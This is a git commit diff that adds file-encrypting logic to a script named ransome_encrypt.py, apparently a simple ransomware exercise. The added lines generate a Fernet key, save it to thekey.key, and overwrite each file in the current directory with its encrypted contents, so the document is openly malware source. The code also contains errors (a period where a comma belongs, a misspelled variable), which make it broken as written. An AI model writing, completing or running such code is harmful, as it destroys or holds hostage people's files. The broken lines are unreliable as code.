ddf07576e9a5e000a9b170eb49c317ff1e0edbf0
@networkchaos <65135432+networkchaos@users.noreply.github.com>
2023-01-10 17:06:20 +0300

    Update ransome_encrypt.py

--- ransome_encrypt.py
+++ ransome_encrypt.py
@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
 import os
+from cryptography.fernet import Fernet
+
 
 #find all the list 
 
@@ -14,3 +16,15 @@ for  file in os.listdir():
 
 
 print(files)
+
+key = Fernet.generate_key()
+
+with open("thekey.key"."wb") as thekey:
+        thekey.write(key)
+
+for file in files:
+        with open(file, "rb") as thefile:
+                contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+                thefile.write(contents_encrpted)
